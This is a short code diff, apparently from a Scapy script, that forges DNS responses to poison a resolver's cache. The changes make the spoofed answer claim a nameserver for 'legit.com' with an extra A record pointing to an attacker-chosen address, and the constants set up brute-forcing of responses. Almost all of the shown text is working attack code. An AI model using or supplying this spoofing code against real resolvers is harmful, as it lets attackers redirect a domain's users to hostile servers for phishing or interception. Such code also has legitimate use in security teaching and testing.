@@ -11,7 +11,8 @@ SOURCE_PORT = 53
 DESTINATION_PORT = 12345
 
 WEBSITE = "web1.legit.com"
-FROM_DNS = "legit.com"
+RRNAME = "legit.com"
+DNS_NAME = "ns1.legit.com"
 
 BRUTEFORCE_TRIES = 200
 MODULO = 65000
@@ -24,10 +25,10 @@ crafted_resp = (IP(dst=DESTINATION,
                 UDP(dport=DESTINATION_PORT, sport=SOURCE_PORT) /
                 DNS(id=1, qr=1, aa=1,
                     qd=DNSQR(qname=WEBSITE),
-                    ns=DNSRR(rrname=WEBSITE, type='NS',
+                    ns=DNSRR(rrname=RRNAME, type='NS',
                              ttl=TTL,
-                             rdata=FROM_DNS),
-                    ar=DNSRR(rrname=FROM_DNS, type='A',
+                             rdata=DNS_NAME),
+                    ar=DNSRR(rrname=DNS_NAME, type='A',
                              ttl=TTL, rdata=REDIRECT_TO)))
 
 dns_layer = crafted_resp[DNS]
